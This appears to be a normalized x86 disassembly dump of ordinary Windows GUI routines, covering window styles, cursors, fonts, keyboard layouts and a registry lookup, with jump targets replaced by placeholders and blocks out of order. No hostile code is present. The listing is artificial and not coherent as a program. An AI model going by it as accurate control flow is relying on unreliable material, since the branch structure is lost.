je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov esi [ ebx + 0x290 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_455198
pop ecx
mov eax [ esi + 0x34 ]
call sub_4333e4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x290 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_4333f4
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_455290
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441d50
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
sub_4552b0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_404160
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_4552e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43ff78
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4552b0
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4552e0
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43ff3c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45535c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1da ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x268 ]
call sub_4552b0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_4552b0
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_4552e0
pop ecx
test al al
je r-xdata
sub_4553b0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_404160
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_4553e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43ff78
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4553b0
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4553e0
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43ff3c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45545c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1da ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x268 ]
call sub_4553b0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_4553b0
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_4553e0
pop ecx
test al al
je r-xdata
sub_4554b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_41e09c
mov esi eax
dec esi
test esi esi
jl r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
xor edi edi
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4554b0
pop ecx
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_44b844
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41e070
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
sub_45552c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
cmp [ ebx + 0x30a ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30c ]
call [ ebx + 0x308 ]
mov al 0x1
mov edi [ ebx + 0x290 ]
test edi edi
je r-xdata
push ebp
mov eax ebx
call sub_4554b0
pop ecx
test al al
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffee
call sub_404160
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4555a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x298 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41e208
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x298 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_4555e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x26c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_43c684
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_43d400
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455628
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_443f88
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_443be8
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x328 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x350 ] 0x0
je r-xdata
movzx eax [ ebx + 0x328 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x350 ]
or eax [ edx * 4 + rw-data ]
push eax
movzx eax [ ebx + 0x329 ]
push eax
mov eax [ ebx + 0x354 ]
push eax
mov eax ebx
call sub_443be8
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_443be8
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_443be8
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_443be8
push eax
call RedrawWindow
sub_45577c
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_43b7c8
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ eax + 0x18 ]
and ecx 0xffff
shl edx 0x10
or ecx edx
mov [ eax + 0x18 ] ecx
test [ eax + 0x1c ] 0x1
jne r-xdata
retn
cmp [ eax + 0x278 ] 0x3
je r-xdata
xor edx edx
call sub_452188
retn
sub_4557b8
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_43b7fc
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ eax + 0x18 ]
and ecx 0xffff0000
and edx 0xffff
or ecx edx
mov [ eax + 0x18 ] ecx
test [ eax + 0x1c ] 0x1
jne r-xdata
retn
cmp [ eax + 0x278 ] 0x3
je r-xdata
xor edx edx
call sub_452188
retn
sub_4557f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
xor edx edx
mov eax ebx
call sub_44f640
mov dl 0x5
mov eax ebx
call sub_4518e0
mov dl 0x1
mov eax ebx
call sub_442710
mov dl 0x3
mov eax ebx
call sub_451c90
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_455860
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_455940
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44259c
dec eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_442400
mov dl 0x5
mov eax [ ebp - 0x8 ]
call sub_43b4bc
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_43c0b8
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404f34
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455947
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov dl 0x1
mov eax esi
call sub_450b48
mov eax [ ebp - 0x4 ]
call sub_405324
mov edx eax
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_43c0c8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43c178
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4055ac
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_455970
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_43ff78
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_4501a0
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_43ff3c
mov edx ebx
pop ecx
mov si 0xffcc
call sub_404160
inc ebp
dec edi
jne r-xdata
sub_4559bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_44259c
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4559e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_453a18
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_455a10
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_453a30
cmp [ ebx + 0x8f ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_443be8
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_44259c
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443be8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_443be8
push eax
call PostMessageA
cmp [ ebx + 0x276 ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4425b0
or ecx 0xffffffff
mov dl 0x1
call sub_43c884
pop esi
pop ebx
retn
sub_455aa8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4432d0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_43d400
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0x94 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_43ba58
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_404160
sub_455b00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_455bd5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43c0b8
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404f34
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
sub eax 0xafff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_405324
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx edi
call sub_43c0c8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455bdc
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebx + 0x4 ]
movzx edx [ eax + 0x57 ]
mov eax esi
call sub_450b48
jmp r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43c178
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4055ac
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_455bfc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44304c
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44259c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4425b0
movzx edx [ ebx + 0x57 ]
call sub_43c068
inc edi
dec esi
jne r-xdata
sub_455ca4
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_455cd4
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_455d28
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41da5c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4560cc
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4560d8
mov eax ebx
call sub_4560e4
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_451b7c
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423438
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423438
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423438
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_456514
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4563e4
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4563e4
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4563e4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_455e80
push ebx
push esi
push edi
push ebp
call sub_404330
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403f64
mov eax [ ebp + 0x88 ]
call sub_403f64
mov eax [ ebp + 0x84 ]
call sub_403f64
mov eax [ ebp + 0x54 ]
call sub_403f64
mov eax [ ebp + 0x50 ]
call sub_403f64
mov eax [ ebp + 0x4c ]
call sub_403f64
mov eax [ ebp + 0x30 ]
call sub_403f64
mov eax [ ebp + 0x34 ]
call sub_403f64
mov eax [ ebp + 0x7c ]
call sub_403f64
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403f64
mov eax ebp
call sub_456140
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41daa8
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4042d8
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4167c8
call sub_403f64
inc edi
dec esi
jne r-xdata
sub_455ff8
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_456044
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_416668
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_416668
mov eax [ rw-data ]
call sub_459410
sub_45607c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_416964
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_416964
mov eax [ rw-data ]
call sub_459410
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_445440
sub_4560e4
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_4561a0
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_456140
push ebx
push esi
push edi
push ebp
mov ebp eax
mov ebx [ ebp + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ ebp + 0x60 ]
cmp eax edx
je r-xdata
mov esi [ ebx + 0x4 ]
cmp esi 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp esi 0xffffffeb
je r-xdata
cmp esi 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test esi esi
jle r-xdata
mov edi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_402d44
mov ebx edi
test ebx ebx
jne r-xdata
sub_4561a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_402d28
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_4561c8
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456373
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45637a
lea eax [ ebp - 0x260 ]
call sub_404e44
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_404e44
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x25 ] 0x0
mov dl 0x1
call sub_41919c
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_40ad28
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_449160
test al al
je r-xdata
xor eax eax
push ebp
push sub_45632f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4050b4
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4050b4
sub_4563e4
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_459280
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_458fe4
mov dl 0x1
mov eax [ rw-data ]
call sub_458fe4
sub_456450
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_456478
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_456450
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
movzx eax [ esp ]
mov [ esp + 0x8 ] ax
movzx eax [ esp + 0x4 ]
mov [ esp + 0xa ] ax
mov eax [ esp + 0x8 ]
push eax
push 0x0
push 0x84
push edi
call SendMessageA
movzx eax ax
or eax 0x2000000
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_456514
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_45665b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_458fe4
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423888
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423888
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_42396c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423888
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_423888
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423888
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
